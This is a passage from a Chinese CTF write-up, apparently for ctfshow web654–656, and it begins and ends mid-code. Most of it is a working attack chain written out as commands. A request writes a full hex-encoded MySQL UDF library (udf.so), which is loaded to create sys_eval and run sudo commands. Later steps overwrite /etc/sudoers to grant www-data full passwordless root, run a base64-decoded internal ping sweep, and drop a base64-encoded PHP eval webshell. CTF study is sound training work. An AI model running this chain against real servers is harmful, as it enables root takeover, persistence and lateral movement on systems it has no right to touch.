</span></span><span class=line><span class=cl>Referer: https://cbc10adb-8c59-4c8d-8421-d76f5803d61f.challenge.ctf.show/system36d/util/common.php?k=flag_651=ctfshow{a4c64b86d754b3b132a138e3e0adcaa6}&amp;a=ls
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=0, i
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>key=key_is_here_you_know&amp;file=..%2Fdb%2Fdata_you_never_know.db&amp;a=file_put_contents(&#39;udf.so&#39;,hex2bin(&#39;7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e8162000&#39;));
</span></span></code></pre></td></tr></table></div></div><p>然后执行命令(在终端里面)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>cp /var/www/html/system36d/util/udf.so /usr/lib/mariadb/plugin/udf.so
</span></span></code></pre></td></tr></table></div></div><p>再在sql里面执行命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>#</span><span class=w> </span><span class=err>创建恶意函数</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>create</span><span class=w> </span><span class=k>function</span><span class=w> </span><span class=n>sys_eval</span><span class=w> </span><span class=k>returns</span><span class=w> </span><span class=n>string</span><span class=w> </span><span class=n>soname</span><span class=w> </span><span class=s1>&#39;udf.so&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>看看成功没</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>mysql</span><span class=p>.</span><span class=n>func</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;sys_eval&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>执行命令</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=n>sys_eval</span><span class=p>(</span><span class=s1>&#39;sudo ls /root&#39;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=n>sys_eval</span><span class=p>(</span><span class=s1>&#39;sudo cat /root/you_win&#39;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>祝贺你，你已经完全控制了这台服务器，为你一路以来的坚持和努力，点赞！
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                  真不容易啊，师傅好样的！
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>不过别高兴的太早，这只是第一关，后面还有更艰难的挑战，你准备好了吗！
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>对了，这是给你的flag 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flag<span class=nb>_</span>654=ctfshow<span class=nb>{</span>4ab2c2ccd0c3c35fdba418d8502f5da9<span class=nb>}</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                   ——大菜鸡 2021年8月2日02时12�
</span></span></code></pre></td></tr></table></div></div><h1 id=web655>web655</h1><p>先给我们自己加权限</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span> <span class=n>ALL</span><span class=o>=</span><span class=p>(</span><span class=n>ALL</span><span class=p>:</span><span class=n>ALL</span><span class=p>)</span> <span class=n>NOPASSWD</span><span class=p>:</span><span class=n>ALL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>echo</span> <span class=s1>&#39;d3d3LWRhdGEgQUxMPShBTEw6QUxMKSBOT1BBU1NXRDpBTEw=&#39;</span><span class=o>|</span><span class=n>base64</span> <span class=o>-</span><span class=n>d</span> <span class=o>&gt;/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>sudoers</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>sys_eval</span><span class=p>(</span><span class=s1>&#39;sudo cp /var/www/html/sudoers /etc/sudoers&#39;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo id
</span></span></code></pre></td></tr></table></div></div><p>欧克啊，内网看看了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>eth0      Link encap:Ethernet  HWaddr 02:42:AC:02:29:04  
</span></span><span class=line><span class=cl>          inet addr:172.2.41.4  Bcast:172.2.41.255  Mask:255.255.255.0
</span></span><span class=line><span class=cl>          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1
</span></span><span class=line><span class=cl>          RX packets:19306 errors:0 dropped:0 overruns:0 frame:0
</span></span><span class=line><span class=cl>          TX packets:16357 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span class=line><span class=cl>          collisions:0 txqueuelen:0 
</span></span><span class=line><span class=cl>          RX bytes:6516844 (6.2 MiB)  TX bytes:22335780 (21.3 MiB)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>lo        Link encap:Local Loopback  
</span></span><span class=line><span class=cl>          inet addr:127.0.0.1  Mask:255.0.0.0
</span></span><span class=line><span class=cl>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span></span><span class=line><span class=cl>          RX packets:105898 errors:0 dropped:0 overruns:0 frame:0
</span></span><span class=line><span class=cl>          TX packets:105898 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span class=line><span class=cl>          collisions:0 txqueuelen:1000 
</span></span><span class=line><span class=cl>          RX bytes:29018140 (27.6 MiB)  TX bytes:29018140 (27.6 MiB)
</span></span></code></pre></td></tr></table></div></div><p>发现IP,<code>172.2.41.4</code></p><p>写个<code>sh</code>来挨个<code>ping</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=nv>ip</span><span class=o>=</span><span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=o>[</span> <span class=nv>$ip</span> !<span class=o>=</span> <span class=s2>&#34;254&#34;</span> <span class=o>]</span><span class=p>;</span> <span class=k>do</span>
</span></span><span class=line><span class=cl>    ping 172.2.41.<span class=nv>$ip</span> -c <span class=m>2</span> <span class=p>|</span> grep -q <span class=s2>&#34;ttl=&#34;</span> <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s2>&#34;172.2.41.</span><span class=nv>$ip</span><span class=s2> yes&#34;</span> <span class=o>||</span> <span class=nb>echo</span> <span class=s2>&#34;172.2.41.</span><span class=nv>$ip</span><span class=s2> no&#34;</span> &gt;/dev/null 2&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span><span class=line><span class=cl>    <span class=nv>ip</span><span class=o>=</span><span class=sb>`</span>expr <span class=s2>&#34;</span><span class=nv>$ip</span><span class=s2>&#34;</span> <span class=s2>&#34;+&#34;</span> <span class=s2>&#34;1&#34;</span><span class=sb>`</span>
</span></span><span class=line><span class=cl><span class=k>done</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>echo &#39;IyEvYmluL2Jhc2gKaXA9MQp3aGlsZSBbICRpcCAhPSAiMjU0IiBdOyBkbwogICAgcGluZyAxNzIuMi40MS4kaXAgLWMgMiB8IGdyZXAgLXEgInR0bD0iICYmIGVjaG8gIjE3Mi4yLjQxLiRpcCB5ZXMiIHx8IGVjaG8gIjE3Mi4yLjQxLiRpcCBubyIgPi9kZXYvbnVsbCAyPiYxCiAgICBpcD1gZXhwciAiJGlwIiAiKyIgIjEiYApkb25l&#39;|base64 -d &gt; 1.sh
</span></span></code></pre></td></tr></table></div></div><p>然后发现死活不能执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>sudo</span> <span class=n>chmod</span> <span class=mi>755</span> <span class=mf>1.</span><span class=n>sh</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>./</span><span class=mf>1.</span><span class=n>sh</span> <span class=o>&gt;</span> <span class=n>a</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=p>)</span> <span class=o>$</span> <span class=n>cat</span> <span class=n>a</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl><span class=mf>172.2</span><span class=o>.</span><span class=mf>41.1</span> <span class=n>yes</span>
</span></span><span class=line><span class=cl><span class=mf>172.2</span><span class=o>.</span><span class=mf>41.2</span> <span class=n>yes</span>
</span></span><span class=line><span class=cl><span class=mf>172.2</span><span class=o>.</span><span class=mf>41.3</span> <span class=n>yes</span>
</span></span><span class=line><span class=cl><span class=mf>172.2</span><span class=o>.</span><span class=mf>41.4</span> <span class=n>yes</span>
</span></span><span class=line><span class=cl><span class=mf>172.2</span><span class=o>.</span><span class=mf>41.5</span> <span class=n>yes</span>
</span></span><span class=line><span class=cl><span class=mf>172.2</span><span class=o>.</span><span class=mf>41.6</span> <span class=n>yes</span>
</span></span><span class=line><span class=cl><span class=mf>172.2</span><span class=o>.</span><span class=mf>41.7</span> <span class=n>yes</span>
</span></span></code></pre></td></tr></table></div></div><p>终于拿到了然后就酷酷测试吧</p><p>在原来的写入文件页面执行命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a=echo `curl http://172.2.41.5/phpinfo.php`;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flag_655=ctfshow{aada21bce99ddeab20020ac714686303}
</span></span></code></pre></td></tr></table></div></div><h1 id=web656>web656</h1><p>同时发现这里还有源码，搞下来米西米西</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>echo</span> <span class=s1>&#39;PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg==&#39;</span><span class=o>|</span><span class=n>base64</span> <span class=o>-</span><span class=n>d</span> <span class=o>&gt;</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>shell</span><span class=o>.</span><span class=n>php</span>
</span></span></code></pre></td></tr></table></div></div><p>我原先误以为重新写个马来连接，能行的，结果还是不行，那么只能在机器上面搞了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo chmod 644 www.zip
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo unzip www.zip
</span></span></code></pre></td></tr></table></div></div><p>还是不行，最后我突然想到说，我直接访问下载不就行了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>index</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$html</span><span class=o>=</span><span class=s1>&#39;管理员请注意，下面是最近登陆失败用户：&lt;br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ret</span><span class=o>=</span><span class=nx>db</span><span class=o>::</span><span class=na>query</span><span class=p>(</span><span class=s1>&#39;select username,login_time,login_ip from ctfshow_logs  order by id desc limit 3&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$ret</span> <span class=k>as</span> <span class=nv>$r</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    	<span class=nv>$html</span> <span class=o>.=</span><span class=s1>&#39;------------&lt;br&gt;用户名: &#39;</span><span class=o>.</span><span class=nx>htmlspecialchars</span><span class=p>(</span><span class=nv>$r</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span><span class=o>.</span><span class=s1>&#39;&lt;br&gt;登陆失败时间: &#39;</span>
</span></span><span class=line><span class=cl>    	<span class=o>.</span><span class=nv>$r</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    	<span class=o>.</span><span class=s1>&#39;&lt;br&gt;登陆失败IP: &#39;</span>
